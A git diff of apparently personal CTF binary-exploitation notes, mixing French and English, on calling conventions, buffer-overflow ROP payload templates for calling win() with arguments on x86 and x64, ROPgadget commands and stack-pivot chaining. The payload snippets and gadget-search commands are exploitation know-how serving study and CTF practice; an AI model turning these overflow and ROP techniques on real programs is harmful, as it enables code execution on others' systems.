@@ -7,9 +7,9 @@
 - https://www.0x0ff.info/2015/buffer-overflow-gdb-part-3/
 - https://github.com/guyinatuxedo/remenissions/blob/master/docs/exploit-methods.md
 
-### Calling conventions
+## Calling conventions
 
-#### 32 vs 64 bits (x86)
+### 32 vs 64 bits (x86)
 
 - https://beta.hackndo.com/conventions-d-appel/
 - https://en.wikipedia.org/wiki/X86_calling_conventions
@@ -20,6 +20,7 @@ En 64 bits, cependant, les 6 premiers sont stockés dans les registres RDI, RSI,
 E.G pour `maFonctionTest(1,2,3)` :
 
 ```
+; .text
 pushl $3 ; pousse la constante 3, d'où le symbole $
 pushl $2 ; idem
 pushl $1 ; idem
@@ -27,14 +28,47 @@ call 0xcafebabe ; appel de maFonctionTest
 add %esp, 0xc ; dépile 0xc = 12 bytes - l'épilogue peut se faire dans callee ou caller (ici) selon la convention
 ```
 
-Voir **ret2libc** ci-dessous:
-
-- https://beta.hackndo.com/conventions-d-appel/
-- https://beta.hackndo.com/rappels-d-architecture/
-- https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc
-
 32 bits: on ecrase le ret et la stack frame suivante
 64 bits: on appelle system() directement
+
+### Calling win(arg1,arg2) on x86 and x64
+
+- [See function_rop](./rop/function_rop)
+- https://beta.hackndo.com/conventions-d-appel/
+- https://dp12.github.io/posts/calling-conventions-for-pwn-and-profit/
+- https://github.com/ir0nstone/cybersec-notes/blob/master/binexp/stack/return-oriented-programming/exploiting-calling-conventions.md
+
+```python
+# x86
+payload = b"\x90" * offset
+payload += p32(win)
+## WE ALREADY ARE ON THE STACK
+## fake return address for win
+payload += p32(0x12345678)
+## no push in reverse order => values in order
+payload += p32(arg1)
+payload += p32(arg2)
+```
+
+```python
+# x64
+payload = b"\x90" * offset
+payload += p64(POP_RDI)			# pop rdi; ret
+payload += p64(arg1)			# value into rdi -> first param
+payload += p64(POP_RSI_R15)		# pop rsi; pop r15; ret
+payload += p64(arg2)			# value into rsi -> first param
+payload += p64(0x0)				# value into r15 -> not important
+payload += p64(win)
+payload += p64(0x0)
+```
+
+### Alignement & x64 MOVABS Issue
+
+- https://ropemporium.com/guide.html => **common pitfalls**
+- https://www.felixcloutier.com/x86/movaps
+- https://stackoverflow.com/questions/1061818/stack-allocation-padding-and-alignment
+- https://gist.githubusercontent.com/dmur1/9bf25015f731f99f94ab5882e48de66d/raw/b78c267f9234dbe57c197dab0c51c508384f0be9/5202c515_go.py
+
 
 ### All call conventions (x86;x86_64,arm,aarch64,powerpc,riscv)
 
@@ -212,64 +246,3 @@ Other method:
 ```txt
 It's a gcc feature controlled by -mpreferred-stack-boundary=n where the compiler tries to keep items on the stack aligned to 2^n. If you changed n to 2, it would only allocate 8 bytes on the stack. The default value for n is 4 i.e. it will try to align to 16-byte boundaries.
 ```
-
-### ROP - Useful notes
-
-```bash
-ROPGadget --binary vuln --ropchain
-ROPGadget --binary vuln --multibr | grep "syscall" #syscall; ret
-ROPGadget --binary vuln | grep "pop"		   #control registers (when *rsp = @ pop rdi)
-# payload += POP_RDI		| @pop rdi;ret	   <- RSP
-# payload += 0xdeadbeef		| 0xdeadbeef	   <- RBP
-
-ROPgadget --binary vuln --string "/bin/sh"         #search string
-```
-
-#### Pivot
-
-- https://www.lazenca.net/display/TEC/16.Stack+pivot
-- https://nickgregory.me/post/2019/04/06/pivoting-around-memory/
-- https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave
-- https://book.hacktricks.xyz/fr/reversing-and-exploiting/linux-exploiting-basic-esp/stack-overflow/stack-pivoting-ebp2ret-ebp-chaining
-- `ret => pc += 4|8` (32|64 bits) : **sE|RBP = &buffer - 4|8**
-
-```asm
-#SEIP = pivot1 + pivot2
-
-MAIN:
-	sEBP = fff
-	EBP = 0xabcde
-	RSP = 0xfghij
-	PADDING - sEBP(.data) - SEIP(&leave_ret*2)
-
-leave_ret1:
-	(leave:)
-	RSP = RBP
-	POP RBP => RBP = &.data
-	(ret:)
-	POP EIP => &(leave_ret2)
-
-leave_ret2:
-	(leave:)
-	RSP = RBP
-	POP RBP
-	(ret:)
-	POP EIP => &buf
-
-section .data
-	buf [read(0,buffer,99999)			] PADDING
-
-NVXbuffer[ROPChain]
-```
-
-![](../images/pivot.png)
-
-### CET & Shadow stack
-
-- https://book.hacktricks.xyz/binary-exploitation/common-binary-protections-and-bypasses/cet-and-shadow-stack
-- https://gmo--cybersecurity-com.translate.goog/blog/intel-cet-bypass-on-linux-userland/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=de&_x_tr_pto=wapp
-
-### JIT - ROP
-
-- https://www.ieee-security.org/TC/SP2013/papers/4977a574.pdf
-- https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/maisuradze
